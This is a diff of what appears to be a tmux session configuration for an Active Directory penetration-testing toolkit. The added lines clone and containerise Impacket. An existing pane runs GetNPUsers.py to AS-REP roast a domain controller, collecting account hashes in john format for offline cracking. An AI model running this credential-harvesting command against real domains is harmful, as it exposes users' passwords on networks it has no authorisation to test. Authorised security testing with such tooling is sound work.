@@ -81,6 +81,9 @@ windows:
       panes:
         - ASREP roast:
           - tmux select-pane -T 'ASREP roast' -t "unauthd:ASREProast.0"
+          - git clone https://github.com/fortra/impacket.git /opt/nomad-tools/latest-Impacket 
+          - docker build -t "impacket:latest" /opt/nomad-tools/latest-Impacket
+          - docker run -it -v /RSM/:/RSM --rm "impacket:latest"
           - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile <%= @settings["rootDir"] %>/usernames.txt -outputfile <%= @settings["rootDir"] %>/scans/unauthd-asrepRoast.txt -format john'; clear
   - coercAuth: 
       panes:
